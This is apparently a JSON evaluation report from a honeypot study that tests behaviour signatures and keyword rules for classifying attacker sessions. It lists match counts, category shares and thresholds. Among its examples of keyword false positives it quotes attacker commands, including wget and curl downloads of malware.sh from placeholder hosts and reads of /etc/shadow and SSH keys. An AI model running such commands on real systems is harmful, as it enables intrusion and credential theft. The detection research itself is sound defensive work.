@@ -1,0 +1,637 @@
+{
+  "source_hashes": {
+    "scripts/behaviour_pattern_analysis.py": "f0263d8032974e4b777538ea8bca72cfb058642b0c94e37c438dac9d46cd0272",
+    "scripts/behaviour_signature_generation.py": "c1b9c7a11699d6fba7e518e2399816142f229a6c0855cb0a15d465914f0de361",
+    "scripts/novelty_assessment.py": "e742e3236e8d77704594e75c8a31d9f7a2eb7179d59a5c579492dd53095a7e22",
+    "reports/behaviour_signatures/behaviour_signatures.json": "a4a665fbeeedded4e80de3db7bde575d7cb2561b0405e043e15f13d4ebabed87",
+    "configs/model_features_v2_frozen.json": "8ae17612eabbbc46240aa1011aff8d6e3617df85380b3daa523201675fc3c288"
+  },
+  "dataset_v2_verified": true,
+  "rows": {
+    "train": 3190,
+    "validation": 1257
+  },
+  "logged_in": {
+    "train": 1500,
+    "validation": 600
+  },
+  "E1_stored_catalogue": {
+    "per_split": {
+      "train": {
+        "assessment_counts": {
+          "Insufficient Evidence": 3190
+        },
+        "max_comparable_features": 0,
+        "max_score": 0.3,
+        "assessment_by_category": {
+          "Insufficient Evidence": {
+            "benign": 863,
+            "botnet": 392,
+            "brute_force": 1018,
+            "lateral_movement": 294,
+            "privilege_escalation": 261,
+            "reconnaissance": 362
+          }
+        }
+      },
+      "validation": {
+        "assessment_counts": {
+          "Insufficient Evidence": 1257
+        },
+        "max_comparable_features": 0,
+        "max_score": 0.3,
+        "assessment_by_category": {
+          "Insufficient Evidence": {
+            "benign": 355,
+            "botnet": 136,
+            "brute_force": 398,
+            "lateral_movement": 118,
+            "privilege_escalation": 99,
+            "reconnaissance": 151
+          }
+        }
+      }
+    },
+    "per_signature": [
+      {
+        "split": "train",
+        "signature": "sig-b1feaa1697ecd1bb",
+        "label": "Command execution",
+        "known_like_matches": 0,
+        "closest_any": 261
+      },
+      {
+        "split": "train",
+        "signature": "sig-7a800a68707bfcfd",
+        "label": "Mixed/Unclassified",
+        "known_like_matches": 0,
+        "closest_any": 1239
+      },
+      {
+        "split": "train",
+        "signature": "sig-47188a96dccd0950",
+        "label": "Credential-attack behaviour",
+        "known_like_matches": 0,
+        "closest_any": 1690
+      },
+      {
+        "split": "validation",
+        "signature": "sig-b1feaa1697ecd1bb",
+        "label": "Command execution",
+        "known_like_matches": 0,
+        "closest_any": 100
+      },
+      {
+        "split": "validation",
+        "signature": "sig-7a800a68707bfcfd",
+        "label": "Mixed/Unclassified",
+        "known_like_matches": 0,
+        "closest_any": 500
+      },
+      {
+        "split": "validation",
+        "signature": "sig-47188a96dccd0950",
+        "label": "Credential-attack behaviour",
+        "known_like_matches": 0,
+        "closest_any": 657
+      }
+    ]
+  },
+  "E2_rules": {
+    "train": {
+      "interpretation_counts_logged_in": {
+        "Mixed/Unclassified": 662,
+        "Download or payload retrieval": 270,
+        "Reconnaissance": 186,
+        "Command execution / privilege escalation": 120,
+        "Persistence-related activity": 113,
+        "Insufficient Evidence": 104,
+        "Command execution": 31,
+        "Credential-attack behaviour": 14
+      },
+      "interpretation_counts_failed": {
+        "Credential-attack behaviour": 1690
+      },
+      "keyword_false_substring_examples": [
+        "'crontab' in 'cat /etc/crontab'",
+        "'id' in 'find / -name id_rsa 2>/dev/null'",
+        "'ls' in 'lscpu'",
+        "'passwd' in 'cat /etc/passwd | grep sh'",
+        "'passwd' in 'cat /etc/passwd'",
+        "'passwd' in 'ls -la /etc/passwd'",
+        "'ps' in 'groups'",
+        "'rm ' in 'find / -perm -4000 -type f 2>/dev/null'",
+        "'rm ' in 'find / -perm -u=s -type f 2>/dev/null'",
+        "'root' in 'ls -la /root/.ssh'",
+        "'scp' in 'lscpu'",
+        "'ssh' in 'cat ~/.ssh/config'",
+        "'ssh' in 'cat ~/.ssh/known_hosts'",
+        "'ssh' in 'ls -la /root/.ssh'",
+        "'ssh' in 'ls -la ~/.ssh'",
+        "'ssh' in 'ps aux | grep sshd'",
+        "'su' in 'cat /etc/issue'",
+        "'su' in 'cat /etc/sudoers'",
+        "'su' in 'sudo -l'",
+        "'sudo' in 'cat /etc/sudoers'",
+        "'w' in './malware.sh'",
+        "'w' in 'cat /etc/passwd | grep sh'",
+        "'w' in 'cat /etc/passwd'",
+        "'w' in 'cat /etc/shadow'",
+        "'w' in 'cat ~/.ssh/known_hosts'",
+        "'w' in 'chmod +x malware.sh'",
+        "'w' in 'chmod 777 malware.sh'",
+        "'w' in 'curl -O http://files.example/malware.sh'",
+        "'w' in 'curl -O http://mirror.example/malware.sh'",
+        "'w' in 'curl -O http://pkg-repo.example/malware.sh'",
+        "'w' in 'ls -la /etc/passwd'",
+        "'w' in 'ls -la /etc/shadow'",
+        "'w' in 'ls -la /usr/bin | grep rws'",
+        "'w' in 'pwd'",
+        "'w' in 'rm -rf malware.sh'",
+        "'w' in 'rm malware.sh'",
+        "'w' in 'sh malware.sh'",
+        "'w' in 'wget -q http://files.example/b.sh -O b.sh'",
+        "'w' in 'wget -q http://files.example/malware.sh -O malware.sh'",
+        "'w' in 'wget -q http://files.example/payload -O payload'"
+      ]
+    },
+    "validation": {
+      "interpretation_counts_logged_in": {
+        "Mixed/Unclassified": 296,
+        "Download or payload retrieval": 99,
+        "Reconnaissance": 72,
+        "Command execution / privilege escalation": 46,
+        "Insufficient Evidence": 42,
+        "Persistence-related activity": 35,
+        "Command execution": 8,
+        "Credential-attack behaviour": 2
+      },
+      "interpretation_counts_failed": {
+        "Credential-attack behaviour": 657
+      },
+      "keyword_false_substring_examples": [
+        "'crontab' in 'cat /etc/crontab'",
+        "'id' in 'find / -name id_rsa 2>/dev/null'",
+        "'ls' in 'lscpu'",
+        "'passwd' in 'cat /etc/passwd | grep sh'",
+        "'passwd' in 'cat /etc/passwd'",
+        "'passwd' in 'ls -la /etc/passwd'",
+        "'ps' in 'groups'",
+        "'rm ' in 'find / -perm -4000 -type f 2>/dev/null'",
+        "'rm ' in 'find / -perm -u=s -type f 2>/dev/null'",
+        "'root' in 'ls -la /root/.ssh'",
+        "'scp' in 'lscpu'",
+        "'ssh' in 'cat ~/.ssh/config'",
+        "'ssh' in 'cat ~/.ssh/known_hosts'",
+        "'ssh' in 'ls -la /root/.ssh'",
+        "'ssh' in 'ls -la ~/.ssh'",
+        "'ssh' in 'ps aux | grep sshd'",
+        "'su' in 'cat /etc/issue'",
+        "'su' in 'cat /etc/sudoers'",
+        "'su' in 'sudo -l'",
+        "'sudo' in 'cat /etc/sudoers'",
+        "'w' in './malware.sh'",
+        "'w' in 'cat /etc/passwd | grep sh'",
+        "'w' in 'cat /etc/passwd'",
+        "'w' in 'cat /etc/shadow'",
+        "'w' in 'cat ~/.ssh/known_hosts'",
+        "'w' in 'chmod +x malware.sh'",
+        "'w' in 'chmod 777 malware.sh'",
+        "'w' in 'curl -O http://files.example/malware.sh'",
+        "'w' in 'curl -O http://pkg-repo.example/malware.sh'",
+        "'w' in 'ls -la /etc/passwd'",
+        "'w' in 'ls -la /etc/shadow'",
+        "'w' in 'ls -la /usr/bin | grep rws'",
+        "'w' in 'pwd'",
+        "'w' in 'rm -rf malware.sh'",
+        "'w' in 'rm malware.sh'",
+        "'w' in 'sh malware.sh'",
+        "'w' in 'wget -q http://files.example/malware.sh -O malware.sh'",
+        "'w' in 'wget -q http://files.example/payload -O payload'",
+        "'w' in 'wget -q http://files.example/update.sh -O update.sh'",
+        "'w' in 'wget -q http://mirror.example/b.sh -O b.sh'"
+      ]
+    }
+  },
+  "E2_label_consistency_train_vs_validation": {
+    "Command execution": {
+      "train": {
+        "n": 31,
+        "category_share": {
+          "brute_force": 0.903,
+          "benign": 0.065,
+          "lateral_movement": 0.032
+        }
+      },
+      "validation": {
+        "n": 8,
+        "category_share": {
+          "brute_force": 1.0
+        }
+      }
+    },
+    "Command execution / privilege escalation": {
+      "train": {
+        "n": 120,
+        "category_share": {
+          "privilege_escalation": 0.483,
+          "brute_force": 0.283,
+          "reconnaissance": 0.2,
+          "lateral_movement": 0.033
+        }
+      },
+      "validation": {
+        "n": 46,
+        "category_share": {
+          "privilege_escalation": 0.435,
+          "brute_force": 0.348,
+          "reconnaissance": 0.174,
+          "lateral_movement": 0.043
+        }
+      }
+    },
+    "Credential-attack behaviour": {
+      "train": {
+        "n": 14,
+        "category_share": {
+          "lateral_movement": 1.0
+        }
+      },
+      "validation": {
+        "n": 2,
+        "category_share": {
+          "lateral_movement": 1.0
+        }
+      }
+    },
+    "Download or payload retrieval": {
+      "train": {
+        "n": 270,
+        "category_share": {
+          "botnet": 0.722,
+          "reconnaissance": 0.115,
+          "benign": 0.085,
+          "lateral_movement": 0.078
+        }
+      },
+      "validation": {
+        "n": 99,
+        "category_share": {
+          "botnet": 0.717,
+          "reconnaissance": 0.141,
+          "benign": 0.101,
+          "lateral_movement": 0.04
+        }
+      }
+    },
+    "Insufficient Evidence": {
+      "train": {
+        "n": 104,
+        "category_share": {
+          "brute_force": 0.952,
+          "benign": 0.048
+        }
+      },
+      "validation": {
+        "n": 42,
+        "category_share": {
+          "brute_force": 0.976,
+          "benign": 0.024
+        }
+      }
+    },
+    "Mixed/Unclassified": {
+      "train": {
+        "n": 662,
+        "category_share": {
+          "benign": 0.512,
+          "lateral_movement": 0.208,
+          "reconnaissance": 0.142,
+          "privilege_escalation": 0.137
+        }
+      },
+      "validation": {
+        "n": 296,
+        "category_share": {
+          "benign": 0.503,
+          "lateral_movement": 0.213,
+          "privilege_escalation": 0.152,
+          "reconnaissance": 0.132
+        }
+      }
+    },
+    "Persistence-related activity": {
+      "train": {
+        "n": 113,
+        "category_share": {
+          "benign": 0.77,
+          "privilege_escalation": 0.23
+        }
+      },
+      "validation": {
+        "n": 35,
+        "category_share": {
+          "benign": 0.886,
+          "privilege_escalation": 0.114
+        }
+      }
+    },
+    "Reconnaissance": {
+      "train": {
+        "n": 186,
+        "category_share": {
+          "benign": 0.565,
+          "brute_force": 0.199,
+          "reconnaissance": 0.161,
+          "lateral_movement": 0.075
+        }
+      },
+      "validation": {
+        "n": 72,
+        "category_share": {
+          "benign": 0.528,
+          "brute_force": 0.194,
+          "reconnaissance": 0.181,
+          "lateral_movement": 0.097
+        }
+      }
+    }
+  },
+  "E3_v2_reference_signatures": {
+    "signatures": [
+      {
+        "signature_id": "sig-ceb071c58646821e",
+        "dec_cluster": 0,
+        "label": "Mixed/Unclassified",
+        "sessions": 730,
+        "confidence": 0.8375,
+        "features": [
+          "shell_operator_lines",
+          "tty_output_bytes",
+          "inter_input_std_s",
+          "time_to_first_input_s",
+          "session_duration_s",
+          "inter_input_mean_s",
+          "input_line_count"
+        ],
+        "command_categories": [
+          "reconnaissance",
+          "file_system",
+          "networking",
+          "credential_attack",
+          "file_transfer",
+          "privilege_escalation",
+          "persistence",
+          "evasion"
+        ],
+        "auth_success_rate": 100.0,
+        "train_category_share": {
+          "benign": 0.429,
+          "lateral_movement": 0.163,
+          "reconnaissance": 0.145,
+          "botnet": 0.126,
+          "privilege_escalation": 0.077,
+          "brute_force": 0.06
+        }
+      },
+      {
+        "signature_id": "sig-9bdd6f77af7fb40f",
+        "dec_cluster": 1,
+        "label": "Credential-attack behaviour",
+        "sessions": 1838,
+        "confidence": 0.8375,
+        "features": [
+          "input_line_count",
+          "tty_output_bytes",
+          "login_success",
+          "session_duration_s",
+          "time_to_first_input_s"
+        ],
+        "command_categories": [
+          "reconnaissance",
+          "file_system",
+          "privilege_escalation"
+        ],
+        "auth_success_rate": 8.05,
+        "train_category_share": {
+          "brute_force": 0.527,
+          "benign": 0.164,
+          "botnet": 0.107,
+          "reconnaissance": 0.1,
+          "lateral_movement": 0.055,
+          "privilege_escalation": 0.047
+        }
+      },
+      {
+        "signature_id": "sig-5bf9142552bb3532",
+        "dec_cluster": 2,
+        "label": "Mixed/Unclassified",
+        "sessions": 622,
+        "confidence": 0.8375,
+        "features": [
+          "tty_output_bytes",
+          "inter_input_std_s",
+          "shell_operator_lines",
+          "time_to_first_input_s",
+          "inter_input_mean_s",
+          "session_duration_s",
+          "input_line_count"
+        ],
+        "command_categories": [
+          "reconnaissance",
+          "file_system",
+          "networking",
+          "credential_attack",
+          "privilege_escalation",
+          "file_transfer",
+          "persistence",
+          "evasion"
+        ],
+        "auth_success_rate": 100.0,
+        "train_category_share": {
+          "benign": 0.399,
+          "privilege_escalation": 0.191,
+          "botnet": 0.166,
+          "lateral_movement": 0.117,
+          "reconnaissance": 0.117,
+          "brute_force": 0.01
+        }
+      }
+    ],
+    "train": {
+      "role": "reference (in-sample)",
+      "assessment_counts_all": {
+        "Known-like": 2172,
+        "Ambiguous": 615,
+        "Potentially Novel": 403
+      },
+      "assessment_counts_logged_in": {
+        "Ambiguous": 615,
+        "Known-like": 483,
+        "Potentially Novel": 402
+      },
+      "assessment_by_category_logged_in": {
+        "Ambiguous": {
+          "benign": 260,
+          "botnet": 98,
+          "brute_force": 0,
+          "lateral_movement": 99,
+          "privilege_escalation": 68,
+          "reconnaissance": 90
+        },
+        "Known-like": {
+          "benign": 193,
+          "botnet": 87,
+          "brute_force": 0,
+          "lateral_movement": 65,
+          "privilege_escalation": 75,
+          "reconnaissance": 63
+        },
+        "Potentially Novel": {
+          "benign": 108,
+          "botnet": 10,
+          "brute_force": 198,
+          "lateral_movement": 28,
+          "privilege_escalation": 32,
+          "reconnaissance": 26
+        }
+      },
+      "assessment_by_category_failed": {
+        "Known-like": {
+          "benign": 301,
+          "botnet": 197,
+          "brute_force": 820,
+          "lateral_movement": 102,
+          "privilege_escalation": 86,
+          "reconnaissance": 183
+        },
+        "Potentially Novel": {
+          "benign": 1,
+          "botnet": 0,
+          "brute_force": 0,
+          "lateral_movement": 0,
+          "privilege_escalation": 0,
+          "reconnaissance": 0
+        }
+      },
+      "closest_label_by_category_logged_in": {
+        "Mixed/Unclassified": {
+          "benign": 561,
+          "botnet": 195,
+          "brute_force": 198,
+          "lateral_movement": 192,
+          "privilege_escalation": 175,
+          "reconnaissance": 179
+        }
+      },
+      "contradictions_logged_in": {
+        "": 1500
+      },
+      "score_median_by_category_logged_in": {
+        "benign": 0.7253,
+        "botnet": 0.7911,
+        "brute_force": 0.4715,
+        "lateral_movement": 0.7332,
+        "privilege_escalation": 0.7694,
+        "reconnaissance": 0.7395
+      }
+    },
+    "validation": {
+      "role": "evaluation (out-of-sample)",
+      "assessment_counts_all": {
+        "Known-like": 849,
+        "Ambiguous": 243,
+        "Potentially Novel": 165
+      },
+      "assessment_counts_logged_in": {
+        "Ambiguous": 243,
+        "Known-like": 193,
+        "Potentially Novel": 164
+      },
+      "assessment_by_category_logged_in": {
+        "Ambiguous": {
+          "benign": 107,
+          "botnet": 38,
+          "brute_force": 0,
+          "lateral_movement": 36,
+          "privilege_escalation": 25,
+          "reconnaissance": 37
+        },
+        "Known-like": {
+          "benign": 75,
+          "botnet": 27,
+          "brute_force": 0,
+          "lateral_movement": 32,
+          "privilege_escalation": 35,
+          "reconnaissance": 24
+        },
+        "Potentially Novel": {
+          "benign": 47,
+          "botnet": 6,
+          "brute_force": 79,
+          "lateral_movement": 10,
+          "privilege_escalation": 9,
+          "reconnaissance": 13
+        }
+      },
+      "assessment_by_category_failed": {
+        "Known-like": {
+          "benign": 126,
+          "botnet": 65,
+          "brute_force": 318,
+          "lateral_movement": 40,
+          "privilege_escalation": 30,
+          "reconnaissance": 77
+        },
+        "Potentially Novel": {
+          "benign": 0,
+          "botnet": 0,
+          "brute_force": 1,
+          "lateral_movement": 0,
+          "privilege_escalation": 0,
+          "reconnaissance": 0
+        }
+      },
+      "closest_label_by_category_logged_in": {
+        "Mixed/Unclassified": {
+          "benign": 229,
+          "botnet": 71,
+          "brute_force": 79,
+          "lateral_movement": 78,
+          "privilege_escalation": 69,
+          "reconnaissance": 74
+        }
+      },
+      "contradictions_logged_in": {
+        "": 600
+      },
+      "score_median_by_category_logged_in": {
+        "benign": 0.7254,
+        "botnet": 0.7898,
+        "brute_force": 0.4686,
+        "lateral_movement": 0.7434,
+        "privilege_escalation": 0.8,
+        "reconnaissance": 0.7547
+      }
+    }
+  },
+  "E3_artefact_dependence_validation": {
+    "validation_slow_find_sessions": 9,
+    "assessment_of_slow_find_sessions": {
+      "Potentially Novel": 9
+    },
+    "assessment_of_pe_non_find_sessions": {
+      "Known-like": 35,
+      "Ambiguous": 25
+    },
+    "score_spearman_vs_session_duration": 0.37756,
+    "score_spearman_vs_tty_output_bytes": 0.271299
+  },
+  "thresholds": {
+    "known_threshold": 0.7,
+    "ambiguous_margin": 0.05,
+    "min_compatible_features": 1,
+    "borderline_score": 0.6
+  },
+  "test_like_paths_opened": []
+}
